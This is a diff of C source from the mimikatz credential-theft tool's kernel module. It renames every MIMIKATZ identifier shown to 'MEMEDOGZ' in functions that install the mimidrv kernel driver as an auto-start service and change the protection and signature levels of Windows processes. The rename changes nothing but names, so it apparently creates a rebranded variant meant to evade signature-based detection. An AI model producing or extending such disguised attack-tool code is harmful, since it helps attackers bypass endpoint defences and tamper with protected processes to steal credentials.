@@ -56,10 +56,10 @@ NTSTATUS kuhl_m_kernel_do(wchar_t * input)
 NTSTATUS kuhl_m_kernel_add_mimidrv(int argc, wchar_t * argv[])
 {
 	wchar_t *absFile;
-	if(kull_m_file_getAbsolutePathOf(MIMIKATZ_DRIVER L".sys", &absFile))
+	if(kull_m_file_getAbsolutePathOf(MEMEDOGZ_DRIVER L".sys", &absFile))
 	{
 		if(kull_m_file_isFileExist(absFile))
-			kull_m_service_install(MIMIKATZ_DRIVER, MIMIKATZ L" driver (" MIMIKATZ_DRIVER L")", absFile, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);
+			kull_m_service_install(MEMEDOGZ_DRIVER, MEMEDOGZ L" driver (" MEMEDOGZ_DRIVER L")", absFile, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE);
 		else PRINT_ERROR_AUTO(L"kull_m_file_isFileExist");
 		LocalFree(absFile);
 	}
@@ -69,7 +69,7 @@ NTSTATUS kuhl_m_kernel_add_mimidrv(int argc, wchar_t * argv[])
 
 NTSTATUS kuhl_m_kernel_remove_mimidrv(int argc, wchar_t * argv[])
 {
-	kull_m_service_uninstall(MIMIKATZ_DRIVER);
+	kull_m_service_uninstall(MEMEDOGZ_DRIVER);
 	return STATUS_SUCCESS;
 }
 
@@ -79,7 +79,7 @@ NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[])
 	PCWCHAR szProcessName, szPid;
 	BOOL isUnprotect;
 
-	if(MIMIKATZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
+	if(MEMEDOGZ_NT_BUILD_NUMBER >= KULL_M_WIN_MIN_BUILD_VISTA)
 	{
 		isUnprotect = kull_m_string_args_byName(argc, argv, L"remove", NULL, NULL);
 		if(kull_m_string_args_byName(argc, argv, L"process", &szProcessName, NULL))
@@ -98,11 +98,11 @@ NTSTATUS kuhl_m_kernel_processProtect(int argc, wchar_t * argv[])
 		{
 			if(!isUnprotect)
 			{
-				if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
+				if(MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_8)
 				{
 					protectInfos.SignatureProtection.SignatureLevel = 1;
 				}
-				else if(MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
+				else if(MEMEDOGZ_NT_BUILD_NUMBER < KULL_M_WIN_MIN_BUILD_BLUE)
 				{
 					protectInfos.SignatureProtection.SignatureLevel = 0x0f;
 					protectInfos.SignatureProtection.SectionSignatureLevel = 0x0f;
